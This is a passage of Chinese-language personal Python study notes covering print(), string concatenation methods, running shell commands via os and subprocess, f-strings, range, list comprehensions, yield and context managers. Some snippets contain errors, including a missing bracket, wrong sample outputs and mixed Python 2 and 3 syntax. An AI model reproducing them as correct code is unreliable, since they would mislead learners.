after the last value, default a newline.\n    flush: whether to forcibly flush the stream.\n```\n将对象输出到文本流文件，由 sep 分开，然后以 end 结束。如果 sep、end、file 和 flush 出现，则必须以关键字参数的形式指定。\n\n## 不使用关键字参数\nprint 函数可以打印任意数量的值（value1, value2, …），这些值由逗号分隔。\n```python\n>>> age = 18\n>>>\n>>> print('age', age)\nage 18\n```\n很容易发现，两个值之间有一个分隔符 - 空格（默认值），这取决于 sep。\n\n## 分隔符\n如果要重新定义分隔符，可以通过 sep 来指定。\n```python\n>>> print('age', age, sep='')  # 去掉空格\nage18\n>>> \n>>> print('www', 'python', 'org', sep='.')  # 以 . 分割\nwww.python.org\n```\n## 结束符\n在 print 中，字符串后面会跟一个 \\n（换行），前面的示例体现的不是很明显，换一个方式就显示出来了。\n```python\n>>> for letter in 'Python':\n...     print(letter)\n... \nP\ny\nt\nh\no\nn\n```\n每打印一个就换行，再打印下一个，这就是 \\n 所起的作用。\n\n要改变这种行为，可以给 end 分配一个任意字符串：\n```python\n>>> for letter in 'Python':\n...     print(letter, end='-')\n... \nP-y-t-h-o-n->>> \n```\n## 输出重定向\n默认情况下，print 的输出被发送到标准输出流（sys.stdout）。通过重新定义 file，可以将输出发送到不同的流（例如：文件或 sys.stderr）中。\n```python\n>>> f = open('data.txt', 'w')\n>>> print('I am a Pythonista', file=f)\n>>> f.close()\n```\n可以看到，在交互式 shell 中，没有得到任何输出，输出被发送到文件 data.txt 中：\n```shell\n[wang@localhost ~]$ cat data.txt \nI am a Pythonista\n```\n也可以通过这种方式将输出重定向到标准错误（sys.stderr）通道：\n```python\n>>> import sys\n>>> \n>>> print('age: 18', file=sys.stderr)\nage: 18\n```\n输出是否缓冲通常由文件决定，但是如果 flush 是 true，则流将被强制刷新。\n\n# python拼接字符串的七种方式\n## 来自C语言的%方式\n```python\nprint('%s %s' % ('Hello', 'world'))\n>>> Hello world\n```\n%号格式化字符串的方式继承自古老的C语言，这在很多编程语言都有类似的实现。上例的%s是一个占位符，它仅代表一段字符串，并不是拼接的实际内容。实际的拼接内容在一个单独的%号后面，放在一个元组里。\n\n类似的占位符还有：%d（代表一个整数）、%f（代表一个浮点数）、%x（代表一个16进制数），等等。%占位符既是这种拼接方式的特点，同时也是其限制，因为每种占位符都有特定意义，实际使用起来太麻烦了。\n\n## format()拼接方式\n### 简洁版\n```python\ns1 = 'Hello {}! My name is {}.'.format('World', 'Python猫')\nprint(s1)\n>>>Hello World! My name is Python猫.\n```\n\n### 对号入座版\n```python\ns2 = 'Hello {0}! My name is {1}.'.format('World', 'Python猫')\ns3 = 'Hello {name1}! My name is {name2}.'.format(name1='World', name2='Python猫')\nprint(s2)\n>>>Hello World! My name is Python猫.\nprint(s3)\n>>>Hello World! My name is Python猫.\n```\n这种方式使用花括号{}做占位符，在format方法中再转入实际的拼接值。容易看出，它实际上是对%号拼接方式的改进。这种方式在Python2.6中开始引入。\n\n上例中，简洁版的花括号中无内容，缺点是容易弄错次序。对号入座版主要有两种，一种传入序列号，一种则使用key-value的方式。实战中，我们更推荐后一种，既不会数错次序，又更直观可读。\n\n## () 类似元组方式\n```python\ns_tuple = ('Hello', ' ', 'world')\ns_like_tuple = ('Hello' ' ' 'world')\n\nprint(s_tuple) \n>>>('Hello', ' ', 'world')\nprint(s_like_tuple) \n>>>Hello world\n\ntype(s_like_tuple) >>>str\n```\n注意，上例中s_like_tuple并不是一个元组，因为元素间没有逗号分隔符，这些元素间可以用空格间隔，也可以不要空格。使用type()查看，发现它就是一个str类型。我没查到这是啥原因，猜测或许()括号中的内容是被Python优化处理了。\n\n这种方式看起来很快捷，<font color=\"red\">但是，括号()内要求元素是真实字符串，不能混用变量，所以不够灵活。</font>\n\n多元素时，不支持有变量\n```python\nstr_1 = 'Hello'\nstr_2 = (str_1 'world')\n>>> SyntaxError: invalid syntax\nstr_3 = (str_1 str_1)\n>>> SyntaxError: invalid syntax\n```\n\n但是下面写法不会报错\n```python\nstr_4 = (str_1)\n```\n## 面向对象模板拼接\n```python\nfrom string import Template\ns = Template('${s1} ${s2}!') \nprint(s.safe_substitute(s1='Hello',s2='world')) \n>>> Hello world!\n```\n说实话，我不喜欢这种实现方式。浓浓的一股被面向对象思想毒害的臭味。\n\n就不多说了。\n\n## 常用的+号方式\n```python\nstr_1 = 'Hello world！ ' \nstr_2 = 'My name is Python猫.'\nprint(str_1 + str_2)\n>>>Hello world！ My name is Python猫.\nprint(str_1)\n>>>Hello world！ \n```\n这种方式最常用、直观、易懂，是入门级的实现方式。但是，它也存在两处让人容易犯错的地方。\n\n首先，新入门编程的同学容易犯错，他们不知道字符串是不可变类型，新的字符串会独占一块新的内存，而原来的字符串保持不变。上例中，拼接前有两段字符串，拼接后实际有三段字符串。\n\n其次，一些有经验的老程序员也容易犯错，他们以为当拼接次数不超过3时，使用+号连接符就会比其它方式快（ps：不少Python教程都是如此建议），但这没有任何合理根据。\n\n事实上，在拼接短的字面值时，由于CPython中的 常数折叠 （constant folding）功能，这些字面值会被转换成更短的形式，例如'a'+'b'+'c' 被转换成'abc'，'hello'+'world'也会被转换成'hello world'。这种转换是在编译期完成的，而到了运行期时就不会再发生任何拼接操作，因此会加快整体计算的速度。\n\n常数折叠优化有一个限度，它要求拼接结果的长度不超过20。所以，当拼接的最终字符串长度不超过20时，+号操作符的方式，会比后面提到的join等方式快得多，这与+号的使用次数无关。\n\n<font color=\"red\">注： 如果现有不是str类型的变量a，  执行 `\"ff\"+a` 操作会报 TypeError: can only concatenate str (not \"int\") to str 错误\n解决方法是将变量a转成str类型： \"ff\"+str(a)</font>\n\n## join()拼接方式\n```python\nstr_list = ['Hello', 'world']\nstr_join1 = ' '.join(str_list)\nstr_join2 = '-'.join(str_list)\nprint(str_join1) >>>Hello world\nprint(str_join2) >>>Hello-world\n```\nstr对象自带的join()方法，接受一个序列参数，可以实现拼接。拼接时，元素若不是字符串，需要先转换一下。可以看出，这种方法比较适用于连接序列对象中（例如列表）的元素，并设置统一的间隔符。\n\n当拼接长度超过20时，这种方式基本上是首选。不过，它的缺点就是，不适合进行零散片段的、不处于序列集合的元素拼接。\n\n## f-string方式\n详见：[f-string.md](file:///F:/vnote/back-end/python/f-string.md)\n```python\nname = 'world'\nmyname = 'python_cat'\nwords = f'Hello {name}. My name is {myname}.'\nprint(words)\n>>> Hello world. My name is python_cat.\n```\nf-string方式出自PEP 498（Literal String Interpolation，字面字符串插值），从Python3.6版本引入。其特点是在字符串前加 f 标识，字符串中间则用花括号{}包裹其它字符串变量。\n\n这种方式在可读性上秒杀format()方式，处理长字符串的拼接时，速度与join()方法相当。\n\n尽管如此，这种方式与其它某些编程语言相比，还是欠优雅，因为它引入了一个 f 标识。而其它某些程序语言可以更简练，比如shell：\n```shell\nname=\"world\"\nmyname=\"python_cat\"\nwords=\"Hello ${name}. My name is ${myname}.\"\necho $words\n>>>Hello world. My name is python_cat.\n```\n\n## Summary\n总结一下，我们前面说的“字符串拼接”，其实是从结果上理解。若从实现原理上划分的话，我们可以将这些方法划分出三种类型：\n\n格式化类：%、format()、template\n\n拼接类：+、()、join()\n\n插值类：f-string\n\n当要处理字符串列表等序列结构时，采用join()方式；拼接长度不超过20时，选用+号操作符方式；长度超过20的情况，高版本选用f-string，低版本时看情况使用format()或join()方式。\n\n# python执行系统命令的方法\n## os.system(\"cmd\")\n这是最简单的一种方法，其执行过程中会输出显示cmd命令执行的信息。\n\n例如：print os.system(\"mkdir test\") >>>输出：0\n\n可以看到结果打印出0，表示命令执行成功；否则表示失败（再次执行该命令，输出：子目录或文件 test 已经存在。1）。\n\n## 使用os.popen(\"cmd\")\n通过os.popen()返回的是 file read 的对象，对其进行读取read()操作可以看到执行的输出\n\n例如：print os.popen(\"adb shell ls /sdcard/ | findstr aa.png\").read() >>> 输出：aa.png（若aa.png存在，否则输出为空）\n\n## subprocess.Popen(\"cmd\")\nsubprocess模块被推荐用来替换一些老的模块和函数，如：os.system、os.spawn*、os.popen*等\n\nsubprocess模块目的是启动一个新的进程并与之通信，最常用是定义类Popen，使用Popen可以创建进程，并与进程进行复杂的交互。其函数原型为：\n```python\nclass subprocess.Popen(args, bufsize=0, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=False, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0)\n```\nPopen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，它是一个阻塞的方法，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，Popen方法也不会打印出cmd的执行信息。\n\n以下罗列常用到的参数：\n\n> args：这个参数必须是字符串或者是一个由字符串成员的列表。其中如果是一个字符串列表的话，那第一个成员为要运行的程序的路径以及程序名称；从第二个成员开始到最后一个成员为运行这个程序需要输入的参数。这与popen中是一样的。\n> bufsize：一般使用比较少，略过。\n> executable：指定要运行的程序，这个一般很少用到，因为要指定运行的程序在args中已经指定了。stdin，stdout ，stderr：分别代表程序的标准输入、标准输出、标准错误处理。可以选择的值有 PIPE，已经存在的打开的文件对象和 NONE。若stdout是文件对象的话，要确保文件对象是处于打开状态。\n> shell：shell参数根据要执行的命令情况来定，如果将参数shell设为True，executable将指定程序使用的shell。在windows平台下，默认的shell由COMSPEC环境变量来指定。\n程序代码如下：程序片段1：使用文件对象输出执行结果\n```python\ncmd = \"adb shell ls /sdcard/ | findstr aa.png\"\nfhandle = open(r\"e:\\aa.txt\", \"w\")\npipe = subprocess.Popen(cmd, shell=True, stdout=fhandle).stdout\nfhandle.close()\n```\ncmd命令执行结果保存在aa.txt文件中\n程序片段2：使用管道输出执行结果\n```python\npipe = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout\nprint pipe.read()\n```\n控制台打印输出执行结果\n\n# f-string\nPython 3.6 提供了一种新的字符串格式化方法：f-strings，不仅比其他格式化方式更易读，更简洁，更不容易出错，而且它们也更快！\n看完本文后，你将了解如何以及为何要使用 f-strings。\n首先，我们先了解下现有的字符串格式化方法。\n在 Python 3.6 之前，字符串格式化方法主要有两种：%格式化 和 str.format()。下面我们简单看下它们的使用方法，以及局限。\n\n## %-格式化\n% 格式化方法从 Python 刚开始时就存在了，堪称「一届元老」，但是 Python 官方文档中并不推荐这种格式化方式：\n\n这里描述的格式化操作容易表现出各种问题，导致许多常见错误（例如无法正确显示元组和字典）。\n使用较新的格式化字符串文字或 str.format() 可以有助于避免这些错误。这些替代方案还提供了更强大，灵活和可扩展的格式化文本方法。\n### 如何使用 %格式化\n一般使用方式，要插入多个变量的话，必须使用元组：\n```python\n>>> name = \"hoxis\"\n>>> age = 18\n>>> \"hello, %s. you are %s ?\" %(name, age)\n'hello, hoxis. you are 18 ?'\n```\n### %格式化的缺陷\n上面的代码示例看起来还能读，但是，一旦开始使用多个参数和更长的字符串，你的代码将很快变得不那么容易阅读：\n```python\n>>> name = \"hoxis\"\n>>> age = 18\n>>> country = \"China\"\n>>> hair = \"black\"\n>>> \"hello, %s. you are %s ?. Your country is %s, and your hair is %s\" %(name, age, country,hair)\n'hello, hoxis. you are 18 ?. Your country is China, and your hair is black'\n```\n可以看出，这种格式化并不是很好，因为它很冗长并且容易导致错误，比如没有正确显示元组或字典。\n不过还好我们还有 str.format()。\n\n## str.format()\nPython 2.6 中引入了 str.format() 格式化方法：https://docs.python.org/3/library/stdtypes.html#str.format。\n\n### str.format() 的使用\nstr.format() 是对 %格式化 的改进，它使用普通函数调用语法，并且可以通过 __format__() 方法为对象进行扩展。\n使用 str.format() 时，替换字段用大括号进行标记：\n```python\n>>> \"hello, {}. you are {}?\".format(name,age)\n'hello, hoxis. you are 18?'\n```\n并且可以通过索引来以其他顺序引用变量：\n```python\n>>> \"hello, {1}. you are {0}?\".format(age,name)\n'hello, hoxis. you are 18?'\n```\n或者可以这样：\n```python\n>>> \"hello, {name}. you are {age1}?\".format(age1=age,name=name)\n'hello, hoxis. you are 18?'\n```\n从字典中读取数据时还可以使用 **：\n```python\n>>> person = {\"name\":\"hoxis\",\"age\":18}\n>>> \"hello, {name}. you are {age}?\".format(**person)\n'hello, hoxis. you are 18?'\n```\n确实，str.format() 比 %格式化高级了一些，但是它还是有自己的缺陷。\n\n### str.format() 的缺陷\n在处理多个参数和更长的字符串时仍然可能非常冗长，麻烦！看看这个：\n```python\n>>> \"hello, {}. you are {} ?. Your country is {}, and your hair is {}\".format(name, age, country,hair)\n'hello, hoxis. you are 18 ?. Your country is China, and your hair is black'\n3 f-Strings\n```\n还好，现在我们有了 f-Strings，它可以使得字符串格式化更加容易。\nf-strings 是指以 f 或 F 开头的字符串，其中以 {} 包含的表达式会进行值替换。\n\n下面从多个方面看下 f-strings 的使用方法，看完后，我相信你会对「人生苦短，我用 Python」有更深地赞同~\n\n## f-Strings 使用方法\n```python\n>>> name = 'hoxis'\n>>> age = 18\n>>> f\"hi, {name}, are you {age}\"\n'hi, hoxis, are you 18'\n>>> F\"hi, {name}, are you {age}\"\n'hi, hoxis, are you 18'\n```\n是不是很简洁？！还有更牛叉的！\n因为 f-strings 是在运行时计算的，那么这就意味着你可以在其中放置任意合法的 Python 表达式，比如：\n\n运算表达式\n```python\n>>> f\"{ 2 * 3 + 1}\"\n'7'\n```\n调用函数\n还可以调用函数：\n```python\n>>> def test(input):\n...     return input.lower()\n...\n>>> name = \"Hoxis\"\n>>> f\"{test(name)} is handsome.\"\n'hoxis is handsome.'\n```\n也可以直接调用内置函数：\n```python\n>>> f\"{name.lower()} is handsome.\"\n'hoxis is handsome.'\n```\n在类中使用\n```python\n>>> class Person:\n...     def __init__(self,name,age):\n...         self.name = name\n...         self.age = age\n...     def __str__(self):\n...         return f\"{self.name} is {self.age}\"\n...     def __repr__(self):\n...         return f\"{self.name} is {self.age}. HAHA!\"\n...\n>>> hoxis = Person(\"hoxis\",18)\n>>> f\"{hoxis}\"\n'hoxis is 18'\n>>> f\"{hoxis!r}\"\n'hoxis is 18. HAHA!'\n>>> print(hoxis)\nhoxis is 18\n>>> hoxis\nhoxis is 18. HAHA!\n```\n多行 f-string\n```python\n>>> name = 'hoxis'\n>>> age = 18\n>>> status = 'Python'\n>>> message = {\n...     f'hi {name}.'\n...     f'you are {age}.'\n...     f'you are learning {status}.'\n... }\n>>>\n>>> message\n{'hi hoxis.you are 18.you are learning Python.'}\n```\n这里需要注意，每行都要加上 f 前缀，否则格式化会不起作用：\n```python\n>>> message = {\n...     f'hi {name}.'\n...     'you are learning {status}.'\n... }\n>>> message\n{'hi hoxis.you are learning {status}.'}\n```\n## 速度对比\n其实，f-string 里的 f 也许可以代表 fast，它比 %格式化方法和 str.format() 都要快：\n```python\nfrom timeit import timeit\n\nprint(timeit(\"\"\"name = \"hoxis\"\nage = 18\n'%s is %s.' % (name, age)\"\"\", number = 10000))\n\nprint(timeit(\"\"\"name = \"hoxis\"\nage = 18\n'{} is {}.'.format(name, age)\"\"\", number = 10000))\n\nprint(timeit(\"\"\"name = \"hoxis\"\nage = 18\nf'{name} is {age}.'\"\"\", number = 10000))\n```\n运行结果：\n```text\n$ python3.6 fstring.py\n0.002238000015495345\n0.004068000009283423\n0.0015349999885074794\n```\n很明显，f-string 是最快的，并且语法是最简洁的，是不是迫不及待地要试试了？\n\n## 注意事项\n### 引号的处理\n可以在字符串中使用各种引号，只要保证和外部的引号不重复即可。\n以下使用方式都是没问题的：\n```python\n>>> f\"{'hoxis'}\"\n'hoxis'\n>>> f'{\"hoxis\"}'\n'hoxis'\n>>> f\"\"\"hoxis\"\"\"\n'hoxis'\n>>> f'''hoxis'''\n'hoxis'\n```\n那如果字符串内部的引号和外部的引号相同时呢？那就需要 \\ 进行转义：\n```python\n>>> f\"You are very \\\"handsome\\\"\"\n'You are very \"handsome\"'\n```\n5.2 括号的处理\n若字符串中包含括号 {}，那么你就需要用双括号包裹它：\n```python\n>>> f\"{{74}}\"\n'{74}'\n\n>>> f\"{{{74}}}\"\n'{74}'\n```\n可以看出，使用三个括号包裹效果一样。\n\n当然，你可以继续增加括号数目，看下有什么其他效果：\n```python\n>>> f\"{{{{74}}}}\"\n'{{74}}'\n>>> f\"{{{{{74}}}}}\"\n'{{74}}'\n>>> f\"{{{{{{74}}}}}}\"\n'{{{74}}}'\n```\n额，那么多括号，看着有点晕了...\n\n## 反斜杠\n上面说了，可以用反斜杠进行转义字符，但是不能在 f-string 表达式中使用：\n```python\n>>> f\"You are very \\\"handsome\\\"\"\n'You are very \"handsome\"'\n>>> f\"{You are very \\\"handsome\\\"}\"\n  File \"<stdin>\", line 1\nSyntaxError: f-string expression part cannot include a backslash\n```\n你可以先在变量里处理好待转义的字符，然后在表达式中引用变量：\n```python\n>>> name = '\"handsome\"'\n>>> f'{name}'\n'\"handsome\"'\n```\n##  注释符号\n不能在表达式中出现 #，否则会报出异常；\n```python\n>>> f\"Hoxis is handsome # really\"\n'Hoxis is handsome # really'\n>>> f\"Hoxis is handsome {#really}\"\n  File \"<stdin>\", line 1\nSyntaxError: f-string expression part cannot include '#'\n```\n\n# range\n它的语法：range(start, stop [,step]) ；start 指的是计数起始值，默认是 0；stop 指的是计数结束值，但不包括 stop ；step 是步长，默认为 1，不可以为 0 。range() 方法生成一段左闭右开的整数范围。\n```python\n>>> a = range(5) # 即 range(0,5)\nrange(0, 5)\n>>> len(a)\n5\n>>> for x in a:\n>>> print(x,end=\" \")\n0 1 2 3 4\n```\n\n对于 range() 函数，有几个注意点：\n（1）它表示的是左闭右开区间；\n（2）它接收的参数必须是整数，可以是负数，但不能是浮点数等其它类型；\n（3）它是不可变的序列类型，可以进行判断元素、查找元素、切片等操作，但不能修改元素；\n（4）它是可迭代对象，却不是迭代器。\n\n```python\n# （1）左闭右开\n>>> for i in range(3, 6):\n>>> print(i,end=\" \")\n3 4 5\n\n# （2）参数类型\n>>> for i in range(-8, -2, 2):\n>>> print(i,end=\" \")\n-8 -6 -4\n>>> range(2.2)\n----------------------------\nTypeError Traceback (most recent call last)\n...\nTypeError: 'float' object cannot be interpreted as an integer\n\n# （3）序列操作\n>>> b = range(1,10)\n1\n>>> b[:-3]\nrange(1, 7)\n>>> b[0] = 2\nTypeError Traceback (most recent call last)\n...\nTypeError: 'range' object does not support item assignment\n\n# （4）不是迭代器\n>>> hasattr(range(3),'__iter__')\nTrue\n>>> hasattr(range(3),'__next__')\nFalse\n>>> hasattr(iter(range(3)),'__next__')\nTrue\n```\n\n# python中__file__\n在Python项目中，经常会获取文件的路径。经常会见到如下的语句：\n```python\nimport os\nos.path.dirname(__file__)\n```\n那么这里的__file__是什么用呢？\n其实就是当前脚本运行的所在路径。\n但是也会分不同的情况。\n如果执行命令时使用绝对路径，__file__就是脚本的绝对路径。\n如果使用的是相对路径，__file__就是脚本的相对路径。\n注：\n如果在交互式环境中，则会爆出异常。因为此时__file__并未生成。\n```shell\nIn [2]: import os\n\nIn [3]: print os.path.dirname(__file__)\n---------------------------------------------------------------------------\nNameError                                 Traceback (most recent call last)\n<ipython-input-3-b4616cfaa58d> in <module>()\n----> 1 print os.path.dirname(__file__)\n\nNameError: name '__file__' is not defined\n```\n\n# Python创建二维数组(关于list的一个小坑)\n## 遇到的问题\n今天写Python代码的时候遇到了一个大坑，差点就耽误我交作业了。。。\n问题是这样的，我需要创建一个二维数组，如下：\n```python\nm = n = 3\ntest = [[0] * m] * n\nprint(\"test =\", test)\n```\n输出结果如下：\n```text\ntest = [[0, 0, 0], [0, 0, 0], [0, 0, 0]]\n```\n是不是看起来没有一点问题？\n一开始我也是这么觉得的，以为是我其他地方用错了什么函数，结果这么一试：\n```python\nm = n = 3\ntest = [[0] * m] * n\nprint(\"test =\", test)\n\ntest[0][0] = 233\nprint(\"test =\", test)\n```\n输出结果如下：\n```text\ntest = [[0, 0, 0], [0, 0, 0], [0, 0, 0]]\ntest = [[233, 0, 0], [233, 0, 0], [233, 0, 0]]\n```\n是不是很惊讶？！\n这个问题真的是折磨我一个中午，去网上一搜，官方文档中给出的说明是这样的：\n``` \nNote also that the copies are shallow; nested structures are not copied. This often haunts new Python programmers; consider:\n\n>>> lists = [[]] * 3\n>>> lists\n[[], [], []]\n>>> lists[0].append(3)\n>>> lists\n[[3], [3], [3]]\nWhat has happened is that [[]] is a one-element list containing an empty list, so all three elements of [[]] * 3 are (pointers to) this single empty list. Modifying any of the elements of lists modifies this single list. You can create a list of different lists this way:\n\n>>>\n>>> lists = [[] for i in range(3)]\n>>> lists[0].append(3)\n>>> lists[1].append(5)\n>>> lists[2].append(7)\n>>> lists\n[[3], [5], [7]]\n```\n也就是说matrix = [array] * 3操作中，只是创建3个指向array的引用，所以一旦array改变，matrix中3个list也会随之改变。\n\n## 创建二维数组的办法\n2.1 直接创建法\n```python\ntest = [0, 0, 0], [0, 0, 0], [0, 0, 0]]\n```\n简单粗暴，不过太麻烦，一般不用。\n\n2.2 [列表生成法](#a)\n```python\ntest = [[0 for i in range(m)] for j in range(n)]\n```\n学会使用列表生成式，终生受益。\n\n2.3 使用模块numpy创建\n```python\nimport numpy as np\ntest = np.zeros((m, n), dtype=np.int)\n```\n\n## 列表生成法\n列表生成式即List Comprehensions，是Python内置的非常简单却强大的可以用来创建list的生成式。\n举个例子，要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用list(range(1, 11))：\n```python\n>>> list(range(1, 11))\n[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]\n```\n但如果要生成[1x1, 2x2, 3x3, ..., 10x10]怎么做？方法一是循环：\n```python\n>>> L = []\n>>> for x in range(1, 11):\n...    L.append(x * x)\n...\n>>> L\n[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]\n```\n但是循环太繁琐，而列表生成式则可以用一行语句代替循环生成上面的list：\n```python\n>>> [x * x for x in range(1, 11)]\n[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]\n```\n写列表生成式时，把要生成的元素x * x放到前面，后面跟for循环，就可以把list创建出来，十分有用，多写几次，很快就可以熟悉这种语法。\n\nfor循环后面还可以加上if判断，这样我们就可以筛选出仅偶数的平方：\n```python\n>>> [x * x for x in range(1, 11) if x % 2 == 0]\n[4, 16, 36, 64, 100]\n```\n还可以使用两层循环，可以生成全排列：\n```python\n>>> [m + n for m in 'ABC' for n in 'XYZ']\n['AX', 'AY', 'AZ', 'BX', 'BY', 'BZ', 'CX', 'CY', 'CZ']\n```\n三层和三层以上的循环就很少用到了。\n运用列表生成式，可以写出非常简洁的代码。例如，列出当前目录下的所有文件和目录名，可以通过一行代码实现：\n```python\n>>> import os # 导入os模块，模块的概念后面讲到\n>>> [d for d in os.listdir('.')] # os.listdir可以列出文件和目录\n['.emacs.d', '.ssh', '.Trash', 'Adlm', 'Applications', 'Desktop', 'Documents', 'Downloads', 'Library', 'Movies', 'Music', 'Pictures', 'Public', 'VirtualBox VMs', 'Workspace', 'XCode']\n```\nfor循环其实可以同时使用两个甚至多个变量，比如dict的items()可以同时迭代key和value：\n```python\n>>> d = {'x': 'A', 'y': 'B', 'z': 'C' }\n>>> for k, v in d.items():\n...     print(k, '=', v)\n...\ny = B\nx = A\nz = C\n```\n因此，列表生成式也可以使用两个变量来生成list：\n```python\n>>> d = {'x': 'A', 'y': 'B', 'z': 'C' }\n>>> [k + '=' + v for k, v in d.items()]\n['y=B', 'x=A', 'z=C']\n```\n最后把一个list中所有的字符串变成小写：\n```python\n>>> L = ['Hello', 'World', 'IBM', 'Apple']\n>>> [s.lower() for s in L]\n['hello', 'world', 'ibm', 'apple']\n```\n\n## list和numpy.array的区别：\n关于python中的二维数组，主要有list和numpy.array两种。\n好吧，其实还有matrices，但它必须是2维的，而numpy arrays (ndarrays) 可以是多维的。\n我们可以通过以下的代码看出二者的区别\n```shell\n>>import numpy as np\n>>a=[[1,2,3],[4,5,6],[7,8,9]]\n>>a\n[[1,2,3],[4,5,6],[7,8,9]]\n>>type(a)\n<type 'list'>\n>>b=np.array(a)\"\"\"List to array conversion\"\"\"\n>>type(b)\n<type 'numpy.array'>\n>>b\narray=([[1,2,3],\n        [4,5,6],\n        [7,8,9]])\n```\nlist对应的索引输出情况：\n```shell\n>>a[1][1]\n5\n>>a[1]\n[4,5,6]\n>>a[1][:]\n[4,5,6]\n>>a[1,1]\"\"\"相当于a[1,1]被认为是a[(1,1)],不支持元组索引\"\"\"\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: list indices must be integers, not tuple\n>>a[:,1]\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: list indices must be integers, not tuple\n```\nnumpy.array对应的索引输出情况：\n```shell\n>>b[1][1]\n5\n>>b[1]\narray([4,5,6])\n>>b[1][:]\narray([4,5,6])\n>>b[1,1]\n5\n>>b[:,1]\narray([2,5,8])\n```\n由上面的简单对比可以看出， numpy.array支持比list更多的索引方式，这也是我们最经常遇到的关于两者的区别。此外从[Numpy-快速处理数据]上可以了解到“由于list的元素可以是任何对象，因此列表中所保存的是对象的指针。这样为了保存一个简单的[1,2,3]，有3个指针和3个整数对象。”\n\n# python中泛型的使用\n```python\nfrom typing import TypeVar, Generic\n\nT = TypeVar('T')\n\nclass Stack(Generic[T]):\n    def __init__(self) -> None:\n        # Create an empty list with items of type T\n        self.items: List[T] = []\n\n    def push(self, item: T) -> None:\n        self.items.append(item)\n\n    def pop(self) -> T:\n        return self.items.pop()\n\n    def empty(self) -> bool:\n        return not self.items\n```\n```python\n# Construct an empty Stack[int] instance\nstack = Stack[int]()\nstack.push(2)\nstack.pop()\nstack.push('x') # Type error\n```\n\n# python中yield用法\nyield在函数中的功能类似于return，不同的是yield每次返回结果之后函数并没有退出，而是每次遇到yield关键字后返回相应结果，并保留函数当前的运行状态，等待下一次的调用。如果一个函数需要多次循环执行一个动作，并且每次执行的结果都是需要的，这种场景很适合使用yield实现。\n包含yield的函数成为一个生成器，生成器同时也是一个迭代器，支持通过next方法获取下一个值。\n\nyield基本使用：\n```python\ndef func():\n    for i in range(0,3):\n        yield i\n \nf = func()\nf.next()\nf.next()\n```\n\n对于生成器，当调用函数next时，将获取生成器yield后边表达式的值；\n\n当执行完最后一次循环后，结束yield语句，生成器会抛出StopIteration异常；\n\n除了next函数，生成器还支持send函数。该函数可以向生成器传递参数。\n\n```python\ndef func(n):\n    for i in range(0,n):\n        val = yield i        \n        print val\n \nf = func(10)\nf.next()\n#f.send(None)\nf.send(2)\nf.send(10)\nprint f.next()\n```\n\n# with用法及原理\nwith 语句适用于对资源进行访问的场合，确保不管使用过程中是否发生异常都会执行必要的“清理”操作，释放资源，比如文件使用后自动关闭／线程中锁的自动获取和释放等。\n\n## 问题引出\n如下代码：\n```python\nfile = open(\"１.txt\")\ndata = file.read()\nfile.close()\n```\n上面代码存在２个问题：\n（１）文件读取发生异常，但没有进行任何处理；\n（２）可能忘记关闭文件句柄；\n\n改进\n```python\ntry:\n    f = open('xxx')\nexcept:\n    print('fail to open')\n    exit(-1)\ntry:\n    do something\nexcept:\n    do something\nfinally:\n    f.close()\n```\n虽然这段代码运行良好，但比较冗长。\n而使用with的话，能够减少冗长，还能自动处理上下文环境产生的异常。如下面代码：\n```python\nwith open(\"１.txt\") as file:\n    data = file.read()\n```\n## with 工作原理\n（１）紧跟with后面的语句被求值后，返回对象的“–enter–()”方法被调用，这个方法的返回值将被赋值给as后面的变量；\n（２）当with后面的代码块全部被执行完之后，将调用前面返回对象的“–exit–()”方法。\nwith工作原理代码示例：\n```python\nclass Sample:\n    def __enter__(self):\n        print \"in __enter__\"\n        return \"Foo\"\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        print \"in __exit__\"\ndef get_sample():\n    return Sample()\nwith get_sample() as sample:\n    print \"Sample: \", sample\n```\n代码的运行结果如下：\n```text\nin __enter__\nSample:  Foo\nin __exit__\n```\n可以看到，整个运行过程如下：\n（１）enter()方法被执行；\n（２）enter()方法的返回值，在这个例子中是”Foo”，赋值给变量sample；\n（３）执行代码块，打印sample变量的值为”Foo”；\n（４）exit()方法被调用；\n\n【注：】exit()方法中有３个参数， exc_type, exc_val, exc_tb，这些参数在异常处理中相当有用。\nexc_type：　错误的类型\nexc_val：　错误类型对应的值\nexc_tb：　代码中错误发生的位置\n示例代码：\n```python\nclass Sample():\n    def __enter__(self):\n        print('in enter')\n        return self\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        print \"type: \", exc_type\n        print \"val: \", exc_val\n        print \"tb: \", exc_tb\n    def do_something(self):\n        bar = 1 / 0\n        return bar + 10\nwith Sample() as sample:\n    sample.do_something()\n```\n程序输出结果：\n```text\nin enter\nTraceback (most recent call last):\ntype:  <type 'exceptions.ZeroDivisionError'>\nval:  integer division or modulo by zero\n  File \"/home/user/cltdevelop/Code/TF_Practice_2017_06_06/with_test.py\", line 36, in <module>\ntb:  <traceback object at 0x7f9e13fc6050>\n    sample.do_something()\n  File \"/home/user/cltdevelop/Code/TF_Practice_2017_06_06/with_test.py\", line 32, in do_something\n    bar = 1 / 0\nZeroDivisionError: integer division or modulo by zero\n\nProcess finished with exit code 1\n```\n## 总结\n实际上，在with后面的代码块抛出异常时，exit()方法被执行。开发库时，清理资源，关闭文件等操作，都可以放在exit()方法中。\n总之，with-as表达式极大的简化了每次写finally的工作，这对代码的优雅性是有极大帮助的。\n如果有多项，可以这样写：\n```python\nWith open('1.txt') as f1, open('2.txt') as  f2:\n    do something\n```\n\n# enumerate()函数的用法\nenumerate是翻译过来是枚举的意思，看下它的方法原型：\nenumerate(sequence, start=0)，返回一个枚举对象。sequence必须是序列或迭代器iterator，或者支持迭代的对象。enumerate()返回对象的每个元素都是一个元组，每个元组包括两个值，一个是计数，一个是sequence的值，计数是从start开始的，start默认为0。\n```python\na=[\"q\",\"w\",\"e\",\"r\"]\nc=enumerate(a)\nfor i in c:\n    